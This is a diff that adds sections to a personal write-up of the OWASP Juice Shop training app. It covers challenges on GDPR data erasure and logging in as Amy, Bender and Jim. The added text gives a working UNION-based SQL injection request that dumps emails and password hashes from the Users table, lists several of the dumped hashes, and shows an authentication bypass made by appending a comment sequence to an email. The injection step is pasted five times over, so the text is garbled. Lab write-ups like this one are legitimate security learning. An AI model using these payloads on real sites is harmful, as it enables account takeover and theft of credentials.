@@ -1,7 +1,6 @@
 Author : Tin Kit
 This is my writeup for OWASP Juice-Shop.
-I did not include the writeups for challenges that were quick and easy to solve. 
-
+I did not include the writeups for challenges that were quick and easy to solve: mostly challenges with Stars 0,1,2.
 
 ======= Stars 1 =======
 
@@ -113,3 +112,71 @@ Challenge: Deluxe Fraud
 	a. And we get a success message back. 
 	b. Apparently the server-side logic failed to check for empty payment modes. 
 
+
+Challenge: GDPR Data Erasure
+1. Just trying to guess Chris's email as chris@juice-sh.op and using SQL Injection for password as 'or 1=1-- fails. This is not surprising.
+2. From the previous challenge, we were able to get the schema from SQL db
+	a. One interesting table is: `Privacy Requests`
+	b. "CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
+	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
+3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
+	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
+	b. Creds of chris:
+		i. chris.pike@juice-sh.op
+		ii. 10a783b9ed19ea1c67c3a27699f0095b
+
+	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
+3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
+	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
+	b. Creds of chris:
+		i. chris.pike@juice-sh.op
+		ii. 10a783b9ed19ea1c67c3a27699f0095b
+
+	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
+3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
+	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
+	b. Creds of chris:
+		i. chris.pike@juice-sh.op
+		ii. 10a783b9ed19ea1c67c3a27699f0095b
+
+	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
+3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
+	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
+	b. Creds of chris:
+		i. chris.pike@juice-sh.op
+		ii. 10a783b9ed19ea1c67c3a27699f0095b
+
+	c. "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
+3. We craft a SQL Injection as such to pull usernames and passwords from Users Table
+	a. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,username,email,password,5,6,7,8,9%20FROM%20Users-- HTTP/1.1
+	b. Creds of chris:
+		i. chris.pike@juice-sh.op
+		ii. 10a783b9ed19ea1c67c3a27699f0095b
+4. We log in with just chris email, adding '-- at the back to comment out the rest of the SQL checks
+	a. This allows us to log in with any password
+	b. eg: chris.pike@juice-sh.op'--
+5. Done
+
+Challenge: Login Amy
+1. "One Important Final Note" is described as follows:
+The example with “D0g.....................” should not be taken literally because if everyone began padding their passwords with simple dots, attackers would soon start adding dots to their guesses to bypass the need for full searching through unknown padding. Instead, YOU should invent your own personal padding policy. You could put some padding in front, and/or interspersed through the phrase, and/or add some more to the end. You could put some characters at the beginning, padding in the middle, and more characters at the end. And also mix-up the padding characters by using simple memorable character pictures like “<->” or “[*]” or “^-^”  . . . but do invent your own!
+
+If you make the result long and memorable, you'll have super-strong passwords that are also easy to use! 
+2. Also, we know amy's email address from the previous SQL injection
+	a. amy@juice-sh.op
+	b. 030f05e45e30710c3ad3c32f00de0473
+3. Although we can bypass the password check by adding '-- to the back of her email, we do not pass this challenge as we ARE NOT logging in with her orginal creds.
+	a. We need to find her password. 
+	b. crackstation returns nothing on that hash.
+4. After googling "One Important Final Note" -> We get led to this site https://www.grc.com/haystack.htm?id
+5. From "One Important Final Note", we can swap out "D0g" with "K1f" [Her husband's name] and add periods "." to the end of it in GRC's Interactive Brute Force Password "Search Space" Calculator until it reaches 93.83 billion trillion trillion centuries as hinted in the Challenge Statment.
+6. Login to finish the challenge.
+
+Challenge: Login Bender
+1. From previous SQL Injection, we know Bender's email address as bender@juice-sh.op with password hash as 0c36e517e3fa95aabf1bbffc6744a4ef.
+2. Logging in as bender@juice-sh.op'-- allows us to bypass the password check
+3. We can use ANY password to login. 
+4. Done.
+
+Challenge: Login Jim
+1. Same as Challenge titled "Login Bender"
